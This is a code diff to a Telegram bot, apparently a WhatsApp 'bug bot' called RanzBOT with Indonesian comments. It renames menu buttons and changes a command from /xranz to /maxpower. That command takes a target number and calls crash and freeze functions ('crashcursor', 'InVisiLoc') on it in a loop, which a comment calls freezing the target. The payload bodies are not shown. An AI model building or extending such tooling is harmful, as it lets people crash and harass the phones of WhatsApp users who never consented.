@@ -365,13 +365,8 @@ const buttons = Markup.inlineKeyboard([
     Markup.button.callback('💥 BugMenu', 'option1'),
     Markup.button.callback('🍂 OwnerMenu', 'option2'),
   ],
-  // Baris kedua: RandomMenu dan About
-  [
-    Markup.button.callback('🌸 RandomMenu', 'randommenu'),
-    Markup.button.callback('ℹ️ About', 'about'),
-  ],
   // Baris terakhir: Tombol URL mengarah ke channel
-  [Markup.button.url('📢 Join Channel', 'https://t.me/')],
+  [Markup.button.url('📢 Ranz Wang$app', 'https://t.me/')],
 ]);
   await ctx.replyWithPhoto(getRandomPhoto(), {
     caption: `
@@ -457,7 +452,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 │
 ㅒ
 │ /xcbeta
-│ /xranz
+│ /maxpower
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
@@ -1382,11 +1377,7 @@ const donerespone = (target, ctx) => {
     const keyboard = [
         [
             {
-                text: "ぢ",
-                callback_data: "/menu"
-            },
-            {
-                text: "☁️ Support Owner",
+                text: "👾 Ranz Wang$app",
                 url: "https://t.me/"
             }
         ]
@@ -1478,7 +1469,7 @@ bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1496,9 +1487,9 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 50; i++) {
+  for (let i = 0; i < 3; i++) {
     await crashcursor(target, { ptcp: true });
-    await caywzzaja_notif(target, { ptcp: true });
+    await InVisiLoc(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
